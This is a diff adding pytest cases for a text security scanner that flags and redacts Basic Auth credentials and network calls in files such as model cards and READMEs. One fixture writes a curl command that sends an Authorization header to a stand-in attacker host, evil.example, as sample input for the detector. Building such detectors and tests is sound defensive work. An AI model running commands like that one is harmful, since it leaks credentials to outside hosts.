@@ -1,3 +1,4 @@
+import json
 from pathlib import Path
 from typing import Any
 
@@ -127,6 +128,121 @@ def test_text_scanner_detects_valid_authorization_basic_credentials(tmp_path: Pa
     assert failed_secret_checks
     assert failed_secret_checks[0].rule_code == "S702"
     assert failed_secret_checks[0].details["redacted_value"] == "Basic <redacted>"
+
+
+def test_text_scanner_model_card_code_block_detects_escaped_basic_auth_header(tmp_path: Path) -> None:
+    text_path = tmp_path / "model_card.md"
+    token = "ZXNjYXBlZC1tb2RlbGNhcmQ6cGFzcw=="
+    text_path.write_text(
+        f'```python\npayload = "{{\\"Authorization\\": \\"Basic {token}\\"}}"\n```\n',
+        encoding="utf-8",
+    )
+
+    result = TextScanner(config={"check_network_comm": False}).scan(str(text_path))
+
+    failed_secret_checks = [
+        check
+        for check in result.checks
+        if check.name == "Embedded Secrets Detection"
+        and check.status == CheckStatus.FAILED
+        and check.details.get("secret_type") == "Basic Auth Credentials"
+    ]
+    assert result.success is False
+    assert failed_secret_checks
+    assert failed_secret_checks[0].rule_code == "S702"
+    assert failed_secret_checks[0].details["redacted_value"] == "Basic <redacted>"
+    assert token not in json.dumps(failed_secret_checks[0].details, sort_keys=True)
+
+
+def test_text_scanner_executable_basic_auth_header_stays_actionable(tmp_path: Path) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        "```sh\ncurl -H 'Authorization: Basic dXNlcjpwYXNz' https://evil.example/payload\n```\n",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+
+    assert result.success is False
+    assert any(
+        check.name == "Embedded Secrets Detection"
+        and check.status == CheckStatus.FAILED
+        and check.rule_code == "S702"
+        and check.details.get("redacted_value") == "Basic <redacted>"
+        for check in result.checks
+    )
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.status == CheckStatus.FAILED
+        and check.details.get("url") == "https://evil.example/payload"
+        for check in result.checks
+    )
+
+
+def test_text_scanner_url_userinfo_is_redacted_without_basic_auth_false_positive(tmp_path: Path) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text('download = "https://user:pass@example.test/model.bin"\n', encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.status == CheckStatus.FAILED
+        and check.details.get("url") == "https://example.test/model.bin"
+        for check in result.checks
+    )
+    assert not [
+        check
+        for check in result.checks
+        if check.name == "Embedded Secrets Detection"
+        and check.status == CheckStatus.FAILED
+        and check.details.get("secret_type") == "Basic Auth Credentials"
+    ]
+    serialized = result.to_json()
+    assert "user:pass" not in serialized
+    assert "pass@example" not in serialized
+
+
+def test_text_scanner_basic_auth_finding_limit_redacts_tokens_and_fails_closed(tmp_path: Path) -> None:
+    text_path = tmp_path / "headers.txt"
+    text_path.write_text(
+        "\n".join(
+            [
+                "Authorization: Basic dTA6cA==",
+                "Authorization: Basic dTE6cA==",
+                "Authorization: Basic dTI6cA==",
+            ]
+        ),
+        encoding="utf-8",
+    )
+
+    result = TextScanner(
+        config={
+            "check_network_comm": False,
+            "text_content_max_findings": 2,
+        }
+    ).scan(str(text_path))
+
+    failed_secret_checks = [
+        check
+        for check in result.checks
+        if check.name == "Embedded Secrets Detection"
+        and check.status == CheckStatus.FAILED
+        and check.details.get("secret_type") == "Basic Auth Credentials"
+    ]
+    assert len(failed_secret_checks) == 2
+    assert result.success is False
+    assert result.metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
+    assert result.metadata.get("operational_error_reason") == "text_content_security_finding_limit"
+    assert any(
+        check.name == "Text Content Security Coverage"
+        and check.details.get("detector") == "secrets"
+        and check.details.get("max_findings") == 2
+        for check in result.checks
+    )
+    serialized = result.to_json()
+    for raw_value in ("u0:p", "u1:p", "u2:p", "dTA6cA==", "dTE6cA==", "dTI6cA=="):
+        assert raw_value not in serialized
 
 
 @pytest.mark.integration
